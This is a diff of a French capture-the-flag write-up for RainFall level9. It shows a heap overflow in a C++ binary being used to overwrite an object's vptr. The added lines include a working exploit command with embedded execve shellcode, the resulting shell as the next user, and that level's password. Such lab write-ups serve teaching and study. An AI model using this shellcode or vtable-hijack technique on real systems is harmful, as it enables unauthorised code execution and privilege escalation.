@@ -22,7 +22,12 @@ Toujours rien ...
 
 Intéressant on remarque que dès que notre argument est supérieur à 108 le programme SEGFAULT.
 
->$ objdump -d level9
+>$ objdump -td level9
+
+Dans la table des symboles on constate la ligne suivante :
+00000000 l    df *ABS*	00000000              level9.cpp
+
+CPP ...
 
 On observe une fonction <main> comme d'habitude, mais aussi plusieurs fonctions avec des noms peu commun : 
 <_ZN1NC2Ei>, <_ZN1NplERS_>, <_ZN1N13setAnnotationEPc> & <_Znwj@plt>
@@ -62,13 +67,6 @@ Autrement dis, il sera possible d'utiliser l'opérateur "+" entre des objets de 
  
 L'opérateur new permet d'allouer de l'espace en mémoire dynamique, c'est-à-dire dans la heap, et renvoie l'adresse mémoire correspondante.
 (https://www.youtube.com/watch?v=0rr66pZlQX4&list=RDCMUCA2YOQHuWzVn1TWmlK5XYxA&index=13)
-
-
-
-
-
-
-
 
 
 ____________________________________________________________________________________________________________________________________________________________________
@@ -141,18 +139,37 @@ Dump of assembler code for function main:
                                                                      
    0x0804867c <+136>:	mov    0x10(%esp),%eax ______EAX____ 0x0804a078 _________ 2nd objet             Au fil de l'étude de l'asm nous n'avons à aucun moment
    0x08048680 <+140>:	mov    (%eax),%eax     ______EAX____ 0x08048848 _________ vptr                  pu constater l'appel de "\bin\sh" ou encore un cat du 
-   0x08048682 <+142>:	mov    (%eax),%edx     ______EDX____ 0x0804873a _________ N::operator+(N&)      du fichier .pass. On deduit don qu'il va falloir injecter
-   0x08048684 <+144>:	mov    0x14(%esp),%eax                                                          un SHELLCODE.
-   0x08048688 <+148>:	mov    %eax,0x4(%esp)                               
-   0x0804868c <+152>:	mov    0x10(%esp),%eax                                                          
-   0x08048690 <+156>:	mov    %eax,(%esp)            
-   0x08048693 <+159>:	call   *%edx       
-   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
-   0x08048698 <+164>:	leave
+   0x08048682 <+142>:	mov    (%eax),%edx     ______EDX____ 0x0804873a _________ N::operator+(N&)      du fichier .pass. On deduit donc qu'il va falloir 
+   0x08048684 <+144>:	mov    0x14(%esp),%eax                                                          injecter un SHELLCODE.
+   0x08048688 <+148>:	mov    %eax,0x4(%esp)                               										
+   0x0804868c <+152>:	mov    0x10(%esp),%eax                                                         						
+   0x08048690 <+156>:	mov    %eax,(%esp)            							          VPTR >>>>> XXXX >>>>> SHELLCODE
+   0x08048693 <+159>:	call   *%edx       	      L'adresse que nous pouvons réécrire est vptr      ____________|          |          |
+   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx	      Or vptr est déréferencé un 1er fois <+142>        _______________________|          |
+   0x08048698 <+164>:	leave			      Puis c'est le contenu d'EDX qui est call <+159> 	__________________________________|
    0x08048699 <+165>:	ret
+					     	      Il nous faut donc une première adresse VPTR qui sera déréferencée XXXX et stocké dans EDX puis c'est
+End of assembler dump.				      (*edx) le contenue de l'adresse XXXX SHELLCODE est call
+_____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
 
-End of assembler dump.
-___________________________________________________________________________________________________________________________________________________________________
 
+Montons notre exploit :
+
+______BUFFER_______
+ [SHELLCODE][XXXX]
+     XXXX    VPTR
+
+Nous allons réécrire notre vptr avec une adresse du début de notre buffer 0x804a00c
+Qui elle contiendra l'adresse suivante sur le buffer 0x804a010
+Qui elle contiendra notre SHELLCODE !!! 
+
+
+level9@RainFall:~$ ./level9 $(python -c "print '\x10\xa0\x04\x08' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 83 + '\x0c\xa0\x04\x08'")
+$ whoami
+bonus0
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+
+Next ...
 
 
